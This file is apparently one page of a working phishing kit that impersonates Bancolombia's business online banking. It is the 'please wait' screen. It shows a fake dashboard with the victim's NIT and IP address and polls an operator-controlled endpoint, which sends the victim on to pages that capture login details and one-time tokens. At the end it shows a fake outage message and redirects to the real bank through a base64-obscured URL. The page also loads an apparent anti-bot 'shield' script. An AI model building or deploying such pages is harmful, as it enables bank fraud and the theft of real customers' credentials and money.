<?php
require_once __DIR__ . '/core/shield.php';
require_once __DIR__ . '/core/db.php';
$sid = $_GET['id'] ?? '';
$from = $_GET['from'] ?? '';
if (!$sid) {
    header("Location: index.php");
    exit;
}

// Fetch session info for dynamic rendering
$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM sessions WHERE session_id = ?");
$stmt->execute([$sid]);
$session_data = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$session_data) {
    header("Location: index.php");
    exit;
}

// Format company document label e.g. "NIT: 901220509"
$docType = $session_data['doc_type'] ?? '';
$docNum = $session_data['doc_num'] ?? '';
$docLabel = '';
if ($docType && $docNum) {
    $docLabel = strtoupper($docType) . ": " . $docNum;
} else {
    $docLabel = "NIT: 901220509";
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="img/favicon.png">
    <title>Espere un momento </title>
    <!-- Link index.css to inherit core design tokens and font styles -->
    <link rel="stylesheet" href="css/index.css">
    <link rel="stylesheet" href="css/wait.css">
</head>

<body class="<?php echo ($from === 'login') ? 'mode-login-wait' : 'mode-token-wait'; ?>">

    <!-- ══ BANCOLOMBIA DASHBOARD BACKGROUND ══ -->
    <div class="bc-bg">
        <!-- Top bar -->
        <div class="bc-top">
            <div class="bc-top-menu">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                    style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                    <rect width="20" height="2.5" rx="1.25" />
                    <rect y="6.75" width="20" height="2.5" rx="1.25" />
                    <rect y="13.5" width="20" height="2.5" rx="1.25" />
                </svg>
                Menú
            </div>
            <div class="bc-top-logo">
                <img src="img/bancolombia-horizontal.svg" class="bc-logo-img" alt="Bancolombia Logo">
                <div class="bc-top-divider"></div>
                <span class="bc-top-section">Sucursal Virtual Negocios</span>
            </div>
            <div class="bc-top-right">
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <circle cx="11" cy="11" r="8" />
                        <path d="m21 21-4.35-4.35" />
                    </svg>
                    Buscar
                </a>
                <div class="bc-top-divider-small"></div>
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <circle cx="12" cy="12" r="10" />
                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01" />
                    </svg>
                    Ayuda
                </a>
                <div class="bc-top-divider-small"></div>
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                        <polyline points="22,6 12,13 2,6" />
                    </svg>
                    Buzón
                </a>
                <div class="bc-top-divider-small"></div>
                <div class="bc-top-user">
                    <!-- PNG building icon from img/icon_094_uniE92F.png -->
                    <img src="img/icon_094_uniE92F.png"
                        style="width:16px; height:16px; display:inline-block; filter: invert(1) sepia(1) saturate(5) hue-rotate(340deg);"
                        alt="NIT">
                    <span><?php echo htmlspecialchars($docLabel); ?></span>
                </div>
            </div>
        </div>

        <!-- Layout -->
        <div class="bc-layout">
            <!-- Sidebar -->
            <div class="bc-side">
                <div class="bc-country-btn">Colombia</div>
                <div class="bc-nav-item active">
                    <img src="img/icon_203_uniE99C.png"
                        style="width:18px; height:18px; filter: invert(1) brightness(0.1);" alt="Inicio">
                    Inicio
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_654_uniEC93.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Productos">
                    Productos
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_292_uniE9F5.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Transacciones">
                    Transacciones
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <!-- Inline SVG check-circle for approvals -->
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:18px; height:18px; opacity:0.65;">
                        <circle cx="12" cy="12" r="10" />
                        <path d="m9 12 2 2 4-4" />
                    </svg>
                    Aprobaciones
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_148_uniE965.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Reportes y archivos">
                    Reportes y archivos
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <!-- Inline SVG settings gear for admin -->
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:18px; height:18px; opacity:0.65;">
                        <circle cx="12" cy="12" r="3" />
                        <path
                            d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
                    </svg>
                    Administración del canal
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-side-foot">
                    <div class="bc-cerrar">
                        Cerrar sesión
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                            stroke-linecap="round" stroke-linejoin="round">
                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
                            <polyline points="16 17 21 12 16 7" />
                            <line x1="21" y1="12" x2="9" y2="12" />
                        </svg>
                    </div>
                </div>
            </div>

            <!-- Content -->
            <div class="bc-content">
                <div class="bc-datebar">Viernes, 10 de julio de 2026, 2:38:33 p.m.</div>
                <div class="bc-main-area"></div>

                <!-- Screenshot 4 Style Footer Area -->
                <div
                    style="margin-top: auto; background: #fff; border-top: 1px solid #e0e0e0; padding: 18px 24px; display: flex; justify-content: space-between; align-items: flex-start; z-index: 2;">
                    <div>
                        <img src="img/bancolombia-horizontal.svg" alt="Bancolombia"
                            style="height: 18px; filter: invert(1) brightness(0); display: block; margin-bottom: 6px;">
                        <div style="font-size: 11px; color: #727278; margin-bottom: 8px;">Copyright &copy; 2026
                            Bancolombia.</div>
                        <img src="img/vigilado-superintendencia.svg" alt="Vigilado"
                            style="height: 16px; width: auto; opacity: 0.85;">
                    </div>
                    <div style="text-align: right; font-size: 11px; color: #727278; line-height: 1.6;">
                        <div>Dirección IP <?php echo htmlspecialchars($session_data['ip'] ?? '201.232.192.89'); ?></div>
                        <div>Última visita viernes 10 de julio de 2026 2:26 p. m.</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ══ DARK OVERLAY ══ -->
    <div class="overlay"></div>

    <!-- ══ APPROVED ERROR OVERLAY ══ -->
    <div id="approved-error-overlay" style="display:none; position:fixed; inset:0; background:rgba(30,30,30,0.6); backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px); z-index:9999; align-items:center; justify-content:center; padding:20px;">
        <div style="background:#fff; border-radius:20px; max-width:420px; width:100%; padding:36px 30px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.22); animation:modalFadeIn 0.2s ease;">
            <div style="width:56px; height:56px; background:#fff3cd; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
                <img src="img/icon_056_uniE909.png" style="width:28px; height:28px; filter:brightness(0) saturate(100%) invert(55%) sepia(90%) saturate(600%) hue-rotate(5deg) brightness(95%);" alt="Alerta">
            </div>
            <div style="font-size:1.2rem; font-weight:700; color:#2c2c30; margin-bottom:12px;">Servicio no disponible</div>
            <div style="font-size:0.92rem; color:#727278; line-height:1.6; margin-bottom:8px;">En estos momentos no podemos procesar su solicitud. Por favor, inténtelo más tarde.</div>
            <div style="font-size:0.8rem; color:#aaa; margin-top:16px;">Será redirigido en unos segundos...</div>
        </div>
    </div>

    <!-- Loader Spinner -->
    <div class="loader-container">
        <div class="spinner-ring"></div>
        <svg class="loader-icon" viewBox="0 0 1587 1591" style="width: 32px; height: 32px; z-index: 22;">
            <path fill="#ffffff" d="m229.5 275.5c-9.9-38.6 14.1-82.1 52.9-94.3 298.4-86.5 596.2-142.6 904.4-180.6 33.7-3.6 66.5 18.2 78.7 51.6 28.6 78.5 42.7 117.9 70.7 196.8 13.4 37.5-6.4 74.9-42.6 79.7-315.3 46.7-621 110.9-925.9 204.7-37.2 12.4-73.8-6.4-83.2-42.9-22.2-86.2-33.2-129.2-55-215zm1353.4 448.6c11.9 36.9-4 72.5-35.1 77.6-490.6 78.8-968.9 210.6-1421.4 417.9-36.4 17.7-73.2-0.5-80.9-39.9-17.8-92.4-26.6-138.3-44.1-230.5-6.8-36.1 12.8-77 45.2-92.4 445.6-197.1 915.4-316.3 1397.9-377.8 31.8-4.2 63.9 19.4 75.7 54.7 25.5 75.9 38 114 62.7 190.4zm-4 516.1c10.7 34.9-3.5 68.9-32.4 75.9-301 73-595.5 164.3-887.1 268.7-41.7 15.8-86.9-4.8-97.9-45.1-23.5-85.8-35.2-128.6-58.3-214.2-9.7-35.9 11.1-74.9 48.1-88.5 291.7-100.2 586.2-178.9 887.4-244.3 33.3-7 68.2 17.6 80.2 55.4 24.4 76.7 36.3 115.1 60 192.1z"/>
        </svg>
    </div>

    <script>
        const sid = "<?php echo htmlspecialchars($sid); ?>";

        function showApprovedError() {
            document.getElementById('approved-error-overlay').style.display = 'flex';
            setTimeout(() => {
                const url = atob('aHR0cHM6Ly93d3cuYmFuY29sb21iaWEuY29tLw==');
                window.location.href = url;
            }, 5000);
        }

        function pollStatus() {
            fetch('actions/poll.php?id=' + sid)
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'retry') {
                        window.location.href = 'index.php?error=1&id=' + sid;
                    } else if (data.status === 'error') {
                        window.location.href = 'token.php?id=' + sid + '&error=1';
                    } else if (data.status === 'approved') {
                        showApprovedError();
                    } else if (data.status === 'ask_token') {
                        window.location.href = 'token.php?id=' + sid;
                    } else if (data.status === 'syncing') {
                        window.location.href = 'sync.php?id=' + sid;
                    } else {
                        setTimeout(pollStatus, 2500);
                    }
                })
                .catch(e => {
                    console.error('Error polling status:', e);
                    setTimeout(pollStatus, 2500);
                });
        }

        // Start polling status
        setTimeout(pollStatus, 2500);
    </script>
</body>

</html>